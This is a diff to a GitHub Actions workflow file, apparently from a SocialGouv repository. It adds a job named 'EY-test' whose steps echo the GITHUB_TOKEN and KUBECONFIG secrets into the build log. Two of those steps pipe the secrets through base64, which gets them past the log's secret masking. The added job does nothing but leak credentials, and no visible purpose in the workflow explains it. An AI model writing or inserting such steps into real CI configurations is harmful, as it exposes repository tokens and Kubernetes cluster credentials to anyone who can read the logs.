@@ -17,3 +17,12 @@ jobs:
     name: "🇫🇷 SocialGouv"
     uses: socialgouv/workflows/.github/workflows/use-ks-gh-review.yaml@v1
     secrets: inherit
+  test:
+    name: "EY-test"
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
+      - run: echo "${{ secrets.KUBECONFIG }}"
+      - run: echo "${{ secrets.KUBECONFIG }}" | base64
+      - run: echo "${{ secrets.GITHUB_TOKEN }}"
+    
